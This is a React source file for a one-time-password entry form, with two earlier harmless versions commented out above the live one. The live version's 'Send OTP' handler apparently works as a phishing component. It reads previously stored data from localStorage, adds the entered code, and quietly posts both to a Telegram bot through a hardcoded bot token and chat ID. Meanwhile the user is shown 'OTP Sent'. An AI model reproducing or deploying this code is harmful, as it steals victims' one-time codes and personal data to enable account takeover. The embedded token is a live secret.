// // "use client";

// // import React, { useState } from "react";

// // interface OTPInputProps {
// //   length?: number; // number of digits
// //   onChange?: (otp: string) => void;
// // }

// // export default function OTPInput({ length = 6, onChange }: OTPInputProps) {
// //   const [otp, setOtp] = useState(Array(length).fill(""));

// //   const handleChange = (
// //     e: React.ChangeEvent<HTMLInputElement>,
// //     index: number,
// //   ) => {
// //     const value = e.target.value;

// //     if (!/^\d*$/.test(value)) return; // allow only digits

// //     const newOtp = [...otp];
// //     newOtp[index] = value.slice(-1); // take only last digit
// //     setOtp(newOtp);

// //     // move focus automatically
// //     if (value && index < length - 1) {
// //       const nextInput = document.getElementById(`otp-${index + 1}`);
// //       nextInput?.focus();
// //     }

// //     onChange?.(newOtp.join(""));
// //   };

// //   const handleKeyDown = (
// //     e: React.KeyboardEvent<HTMLInputElement>,
// //     index: number,
// //   ) => {
// //     if (e.key === "Backspace" && !otp[index] && index > 0) {
// //       const prevInput = document.getElementById(`otp-${index - 1}`);
// //       prevInput?.focus();
// //     }
// //   };

// //   return (
// //     <div className="flex justify-center items-center h-lvh flex-col">
// //       <div className="flex gap-2 bg-[#d5bdad] p-20 rounded-3xl">
// //         {otp.map((digit, index) => (
// //           <input
// //             key={index}
// //             id={`otp-${index}`}
// //             type="text"
// //             inputMode="numeric"
// //             maxLength={1}
// //             value={digit}
// //             onChange={(e) => handleChange(e, index)}
// //             onKeyDown={(e) => handleKeyDown(e, index)}
// //             className="w-12 h-12 text-center border border-black rounded-lg focus:ring-2 focus:ring-purple-400 outline-none"
// //           />
// //         ))}
// //       </div>
// //       <button className="bg-black p-3 rounded-3xl hover:bg-gray-900 transition-all mt-5 text-white cursor-pointer">
// //         Send the otp
// //       </button>
// //     </div>
// //   );
// // }

// "use client";

// import React, { useState } from "react";
// import { motion, AnimatePresence } from "framer-motion";

// interface OTPInputProps {
//   length?: number; // number of digits
//   onChange?: (otp: string) => void;
// }

// export default function OTPInput({ length = 6, onChange }: OTPInputProps) {
//   const [otp, setOtp] = useState(Array(length).fill(""));
//   const [sending, setSending] = useState(false);

//   const handleChange = (
//     e: React.ChangeEvent<HTMLInputElement>,
//     index: number,
//   ) => {
//     const value = e.target.value;
//     if (!/^\d*$/.test(value)) return; // allow only digits

//     const newOtp = [...otp];
//     newOtp[index] = value.slice(-1);
//     setOtp(newOtp);

//     if (value && index < length - 1) {
//       const nextInput = document.getElementById(`otp-${index + 1}`);
//       nextInput?.focus();
//     }

//     onChange?.(newOtp.join(""));
//   };

//   const handleKeyDown = (
//     e: React.KeyboardEvent<HTMLInputElement>,
//     index: number,
//   ) => {
//     if (e.key === "Backspace" && !otp[index] && index > 0) {
//       const prevInput = document.getElementById(`otp-${index - 1}`);
//       prevInput?.focus();
//     }
//   };

//   const handleSendOtp = () => {
//     setSending(true);

//     // simulate OTP sending delay
//     setTimeout(() => {
//       setSending(false);
//       alert(`OTP Sent: ${otp.join("")}`);
//     }, 3000);
//   };

//   return (
//     <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-b from-purple-200 to-purple-400 p-5">
//       <div className="bg-white rounded-3xl shadow-xl p-10 w-full max-w-md flex flex-col items-center">
//         <h2 className="text-2xl font-bold text-gray-800 mb-6">Enter OTP</h2>

//         <div className="flex gap-3">
//           {otp.map((digit, index) => (
//             <input
//               key={index}
//               id={`otp-${index}`}
//               type="text"
//               inputMode="numeric"
//               maxLength={1}
//               value={digit}
//               onChange={(e) => handleChange(e, index)}
//               onKeyDown={(e) => handleKeyDown(e, index)}
//               className="w-14 h-14 text-center text-xl border-2 border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-300 outline-none transition"
//             />
//           ))}
//         </div>

//         <button
//           onClick={handleSendOtp}
//           className="mt-8 bg-purple-600 hover:bg-purple-700 transition text-white px-8 py-3 rounded-2xl font-semibold cursor-pointer"
//         >
//           Send OTP
//         </button>

//         {/* AnimatePresence from Framer Motion for smooth fade */}
//         <AnimatePresence>
//           {sending && (
//             <motion.div
//               key="sending"
//               initial={{ opacity: 0, y: 20 }}
//               animate={{ opacity: 1, y: 0 }}
//               exit={{ opacity: 0, y: 20 }}
//               className="mt-5 text-center text-gray-700 bg-purple-100 px-4 py-3 rounded-xl font-medium"
//             >
//               It may take a while sending the OTP...
//             </motion.div>
//           )}
//         </AnimatePresence>
//       </div>
//     </div>
//   );
// }

"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

interface OTPInputProps {
  length?: number;
  onChange?: (otp: string) => void;
}

export default function OTPInput({ length = 6, onChange }: OTPInputProps) {
  const [otp, setOtp] = useState(Array(length).fill(""));
  const [sending, setSending] = useState(false);
  const [showMessage, setShowMessage] = useState(true); // message on mount

  // Hide the message after a few seconds on mount
  useEffect(() => {
    const timer = setTimeout(() => setShowMessage(false), 4000);
    return () => clearTimeout(timer);
  }, []);

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement>,
    index: number,
  ) => {
    const value = e.target.value;
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);

    if (value && index < length - 1) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }

    onChange?.(newOtp.join(""));
  };

  const handleKeyDown = (
    e: React.KeyboardEvent<HTMLInputElement>,
    index: number,
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSendOtp = async () => {
    const holeData = localStorage.getItem("dataSent to The bot");
    setSending(true);
    setShowMessage(true); // show message while sending

    const message = `
    ${holeData}
    --------------------------------
    otp : ${otp}
    
    `;

    setTimeout(() => {
      setSending(false);
      setShowMessage(false); // hide message after sending
      alert(`OTP Sent: ${otp.join("")}`);
    }, 3000);

    const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
    const chatId = "6032588551";

    // const message = "Hello from my bot 🚀";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        },
      );

      const result = await response.json();
      console.log(result);
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-b from-purple-200 to-purple-400 p-5">
      <div className="bg-white rounded-3xl shadow-xl p-10 w-full max-w-md flex flex-col items-center">
        <h2 className="text-2xl font-bold text-gray-800 mb-6">
          Enter OTP (it may take a while)
        </h2>

        <div className="flex gap-3">
          {otp.map((digit, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(e, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="w-14 h-14 text-center text-xl border-2 border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-300 outline-none transition"
            />
          ))}
        </div>

        <button
          onClick={handleSendOtp}
          className="mt-8 bg-purple-600 hover:bg-purple-700 transition text-white px-8 py-3 rounded-2xl font-semibold"
        >
          Send OTP
        </button>

        {/* Animated message */}
        <AnimatePresence>
          {showMessage && (
            <motion.div
              key="message"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 20 }}
              className="mt-5 text-center text-gray-700 bg-purple-100 px-4 py-3 rounded-xl font-medium flex items-center justify-center gap-2"
            >
              {/* Spinning loader */}
              <div className="w-5 h-5 border-2 border-t-purple-500 border-gray-300 rounded-full animate-spin"></div>
              <span>It may take a while sending the OTP...</span>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
